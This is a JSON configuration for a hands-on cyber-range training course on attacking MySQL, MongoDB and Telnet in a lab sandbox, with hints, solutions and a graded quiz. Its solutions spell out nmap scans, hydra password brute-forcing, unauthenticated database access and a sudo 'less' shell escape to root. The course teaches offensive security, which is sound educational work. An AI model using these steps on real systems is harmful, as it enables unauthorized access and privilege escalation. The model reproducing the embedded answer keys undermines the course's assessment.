{
  "title": "MongoDB & MySQL Attack Training",
  "description": "Hands-on cybersecurity training covering network reconnaissance, MySQL brute-force, MongoDB unauthenticated access, Telnet password guessing, and privilege escalation.",
  "prerequisites": [],
  "outcomes": [
    "Scanning ports with nmap",
    "Password brute-forcing MySQL with hydra",
    "Exploiting unauthenticated MongoDB access",
    "Password guessing Telnet with hydra",
    "Privilege escalation using misconfigured sudo"
  ],
  "state": "UNRELEASED",
  "estimated_duration": 90,
  "variant_sandboxes": false,
  "levels": [
    {
      "title": "Info",
      "level_type": "INFO_LEVEL",
      "order": 0,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "content": "# MongoDB & MySQL Attack Training\n\nWelcome to this hands-on cybersecurity training on the NASTP CyberRangeCZ Platform.\n\n**Note**: It is recommended to use the Chrome browser. In case you run into difficulties with submitting the answer, try to Log out and Log in again.\n\n| Level | Level Name | Level Type |\n|:------:|------| ------ |\n| 1. | Info | Info |\n| 2. | Get Access | Access |\n| 3. | Network Reconnaissance | Training |\n| 4. | MySQL Password Brute-Force | Training |\n| 5. | MongoDB Unauthenticated Access | Training |\n| 6. | Telnet Password Guessing | Training |\n| 7. | Privilege Escalation | Training |\n| 8. | Final Assessment | Assessment |\n\n## Topology\n\n| Host | IP | Services |\n|------|----|----------|\n| kali (attacker) | 192.168.30.10 | — |\n| server | 192.168.20.5 | Telnet :2323 |\n| db-server | 192.168.40.5 | MySQL :3306, MongoDB :27017 |\n\n```\nKali (192.168.30.10) ──► router ──► server (192.168.20.5)    [Telnet :2323]\n                                └──► db-server (192.168.40.5) [MySQL :3306, MongoDB :27017]\n```\n\n**Leading author:** Zeeshan Khan"
    },
    {
      "title": "Get Access",
      "level_type": "ACCESS_LEVEL",
      "order": 1,
      "estimated_duration": 0,
      "minimal_possible_solve_time": null,
      "passkey": "start",
      "cloud_content": "Your first task is to access the sandbox where you will complete all following tasks. After you have successfully connected, submit the answer **`start`**.\n\n### Sandbox Access\n1. In the topology overview on the right, right-click on **`kali`** and then click on **`Open console`**.\n2. Login with username **`debian`** and password **`Kali@1234`**.\n\nAlternatively, you can use SSH to connect to the machine. See [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.\n\n### Network Overview\n| Host | IP Address |\n|------|------------|\n| kali (you are here) | 192.168.30.10 |\n| server | 192.168.20.5 |\n| db-server | 192.168.40.5 |",
      "local_content": "This sandbox has not been tested for use with local sandbox."
    },
    {
      "title": "Network Reconnaissance",
      "level_type": "TRAINING_LEVEL",
      "order": 2,
      "estimated_duration": 10,
      "minimal_possible_solve_time": 1,
      "answer": "3306,27017",
      "answer_variable_name": "open_ports",
      "content": "Your goal is to discover what services are running on **`db-server`** (`192.168.40.5`).\n\nUse **nmap** to scan the target and identify open ports. The answer is the two open port numbers separated by a comma (e.g. `3306,27017`).\n",
      "solution": "1. Run the following command from the Kali machine:\n\n   **`nmap -sV -p 3306,27017 192.168.40.5`**\n\n2. You will see two open ports:\n   - **3306** — MySQL database\n   - **27017** — MongoDB database\n\n3. Enter **`3306,27017`** as the answer.",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Which tool to use",
          "content": "Use **nmap** to scan for open ports. Try **`nmap -sV -p- 192.168.40.5`** to scan all ports with version detection.",
          "hint_penalty": 20,
          "order": 0
        },
        {
          "title": "Targeted scan",
          "content": "If a full scan is too slow, target common database ports: **`nmap -sV -p 3306,27017 192.168.40.5`**",
          "hint_penalty": 30,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 10,
      "attachments": [],
      "max_score": 50,
      "variant_answers": false,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0007.T1046"
        },
        {
          "technique_key": "TA0043.T1595"
        }
      ],
      "expected_commands": [
        "nmap"
      ],
      "commands_required": true
    },
    {
      "title": "MySQL Password Brute-Force",
      "level_type": "TRAINING_LEVEL",
      "order": 3,
      "estimated_duration": 20,
      "minimal_possible_solve_time": 1,
      "answer": null,
      "answer_variable_name": "mysql_flag",
      "content": "You have discovered MySQL running on **`db-server`** (`192.168.40.5:3306`).\n\nYou know the username is **`dbuser`** but not the password. Use a dictionary attack to find it.\n\nA wordlist is available at `/usr/share/wordlists/rockyou.txt`.\n\nOnce you have the credentials, connect to MySQL and retrieve the flag from the **`company`** database.\n",
      "solution": "1. Run hydra to brute-force the MySQL password:\n\n   **`hydra -l dbuser -P /usr/share/wordlists/rockyou.txt mysql://192.168.40.5`**\n\n2. Once the password is found, connect to MySQL:\n\n   **`mysql -h 192.168.40.5 -u dbuser -p`**\n\n3. Retrieve the flag:\n\n   **`USE company;`**\n   **`SELECT * FROM employees;`**\n\n4. The flag is in the **`secret`** column. Submit it as the answer.",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Brute-force tool",
          "content": "Use **hydra** for the brute-force attack. The syntax for MySQL is:\n**`hydra -l <username> -P <wordlist> mysql://<target>`**",
          "hint_penalty": 20,
          "order": 0
        },
        {
          "title": "Connecting to MySQL",
          "content": "Once you have the password, connect using:\n**`mysql -h 192.168.40.5 -u dbuser -p`**\nThen run: `USE company;` and `SELECT * FROM employees;`",
          "hint_penalty": 30,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 10,
      "attachments": [],
      "max_score": 100,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0006.T1110"
        }
      ],
      "expected_commands": [
        "hydra",
        "mysql"
      ],
      "commands_required": true
    },
    {
      "title": "MongoDB Unauthenticated Access",
      "level_type": "TRAINING_LEVEL",
      "order": 4,
      "estimated_duration": 15,
      "minimal_possible_solve_time": 1,
      "answer": null,
      "answer_variable_name": "mongodb_flag",
      "content": "You have also discovered **MongoDB** running on **`db-server`** (`192.168.40.5:27017`).\n\nThis MongoDB instance is **misconfigured** — it has no authentication enabled. Connect directly and retrieve the flag from the **`records`** database.\n",
      "solution": "1. Connect to MongoDB directly (no credentials needed):\n\n   **`mongosh --host 192.168.40.5 --port 27017`**\n\n2. Switch to the records database and find the flag:\n\n   **`use records`**\n   **`db.flags.find()`**\n\n3. Submit the flag value as the answer.",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Connecting to MongoDB",
          "content": "Use **mongosh** to connect:\n**`mongosh --host 192.168.40.5 --port 27017`**\nNo username or password is required.",
          "hint_penalty": 20,
          "order": 0
        },
        {
          "title": "Finding the flag",
          "content": "Once connected, run:\n**`use records`**\n**`db.flags.find()`**",
          "hint_penalty": 20,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 10,
      "attachments": [],
      "max_score": 100,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0006.T1078"
        },
        {
          "technique_key": "TA0007.T1046"
        }
      ],
      "expected_commands": [
        "mongosh"
      ],
      "commands_required": true
    },
    {
      "title": "Telnet Password Guessing",
      "level_type": "TRAINING_LEVEL",
      "order": 5,
      "estimated_duration": 15,
      "minimal_possible_solve_time": 1,
      "answer": null,
      "answer_variable_name": "telnet_flag",
      "content": "Now focus on **`server`** (`192.168.20.5`). There is a **Telnet** service running on port **2323**.\n\nYou know the username is **`alice`** but not the password. A password list is available at `/home/debian/passlist.txt`.\n\nBrute-force the password, log in via Telnet, and retrieve the flag from alice's home directory.\n",
      "solution": "1. Run hydra to brute-force the Telnet password:\n\n   **`hydra -l alice -P /home/debian/passlist.txt telnet://192.168.20.5 -s 2323`**\n\n2. This will reveal alice's password. Connect via Telnet:\n\n   **`telnet 192.168.20.5 2323`**\n\n3. Log in with username **`alice`** and the discovered password.\n\n4. Read the flag:\n\n   **`cat flag.txt`**\n\n5. Submit the flag as the answer.",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Brute-forcing Telnet",
          "content": "Use **hydra** with the `-s` flag to specify a non-default port:\n**`hydra -l alice -P /home/debian/passlist.txt telnet://192.168.20.5 -s 2323`**",
          "hint_penalty": 20,
          "order": 0
        },
        {
          "title": "Connecting via Telnet",
          "content": "Use: **`telnet 192.168.20.5 2323`**\nThen enter the username and password when prompted.",
          "hint_penalty": 10,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 10,
      "attachments": [],
      "max_score": 100,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0006.T1110"
        }
      ],
      "expected_commands": [
        "hydra",
        "telnet",
        "cat"
      ],
      "commands_required": true
    },
    {
      "title": "Privilege Escalation",
      "level_type": "TRAINING_LEVEL",
      "order": 6,
      "estimated_duration": 15,
      "minimal_possible_solve_time": 1,
      "answer": null,
      "answer_variable_name": "root_flag",
      "content": "You are now logged in as **`alice`** on the server. There is a flag only accessible to **root**.\n\nOne common privilege escalation vector is a misconfigured **sudo**. Check what alice can run with sudo:\n\n**`sudo --list`**\n\nCan you find a way to get a root shell?\n",
      "solution": "1. Check sudo permissions:\n\n   **`sudo --list`**\n\n   You will see alice can run: `sudo less /home/alice/flag.txt`\n\n2. Run the command:\n\n   **`sudo less /home/alice/flag.txt`**\n\n3. While inside `less`, escape to a shell by typing:\n\n   **`!sh`**\n\n   This gives you a root shell.\n\n4. Read the root flag:\n\n   **`cat /root/flag.txt`**\n\n5. Submit the flag as the answer.",
      "solution_penalized": true,
      "hints": [
        {
          "title": "Check sudo permissions",
          "content": "Run **`sudo --list`** to see what commands alice can run as root.",
          "hint_penalty": 20,
          "order": 0
        },
        {
          "title": "Escaping less to get a shell",
          "content": "Run **`sudo less /home/alice/flag.txt`**, then type **`!sh`** to spawn a root shell.",
          "hint_penalty": 60,
          "order": 1
        }
      ],
      "incorrect_answer_limit": 10,
      "attachments": [],
      "max_score": 100,
      "variant_answers": true,
      "reference_solution": [],
      "mitre_techniques": [
        {
          "technique_key": "TA0004.T1068"
        }
      ],
      "expected_commands": [
        "sudo",
        "cat",
        "ls"
      ],
      "commands_required": true
    },
    {
      "title": "Final Assessment",
      "level_type": "ASSESSMENT_LEVEL",
      "order": 7,
      "estimated_duration": 10,
      "minimal_possible_solve_time": null,
      "instructions": "Answer the following questions to complete the training.",
      "assessment_type": "TEST",
      "questions": [
        {
          "question_type": "MCQ",
          "text": "Which tool did you use to brute-force the MySQL password?",
          "points": 25,
          "penalty": 0,
          "order": 0,
          "answer_required": true,
          "choices": [
            {
              "text": "nmap",
              "correct": false,
              "order": 0
            },
            {
              "text": "hydra",
              "correct": true,
              "order": 1
            },
            {
              "text": "sqlmap",
              "correct": false,
              "order": 2
            },
            {
              "text": "mongosh",
              "correct": false,
              "order": 3
            }
          ]
        },
        {
          "question_type": "MCQ",
          "text": "Why was MongoDB accessible without a password?",
          "points": 25,
          "penalty": 0,
          "order": 1,
          "answer_required": true,
          "choices": [
            {
              "text": "MongoDB does not support authentication",
              "correct": false,
              "order": 0
            },
            {
              "text": "The MongoDB instance was misconfigured with no authentication enabled",
              "correct": true,
              "order": 1
            },
            {
              "text": "The password was empty",
              "correct": false,
              "order": 2
            },
            {
              "text": "MongoDB only supports local connections",
              "correct": false,
              "order": 3
            }
          ]
        },
        {
          "question_type": "EMI",
          "text": "Match each attack with the correct tool used.",
          "points": 25,
          "penalty": 0,
          "order": 2,
          "answer_required": true,
          "extended_matching_options": [
            {
              "text": "nmap",
              "order": 0
            },
            {
              "text": "hydra",
              "order": 1
            },
            {
              "text": "mongosh",
              "order": 2
            },
            {
              "text": "mysql",
              "order": 3
            }
          ],
          "extended_matching_statements": [
            {
              "text": "Port scanning",
              "order": 0,
              "correct_option_order": 0
            },
            {
              "text": "Brute-forcing MySQL",
              "order": 1,
              "correct_option_order": 1
            },
            {
              "text": "Accessing unauthenticated MongoDB",
              "order": 2,
              "correct_option_order": 2
            },
            {
              "text": "Querying MySQL database",
              "order": 3,
              "correct_option_order": 3
            }
          ]
        },
        {
          "question_type": "FFQ",
          "text": "What sudo command allowed privilege escalation to root?",
          "points": 25,
          "penalty": 0,
          "order": 3,
          "answer_required": true,
          "choices": [
            {
              "text": "sudo less /home/alice/flag.txt",
              "correct": true,
              "order": 0
            }
          ]
        }
      ]
    }
  ]
}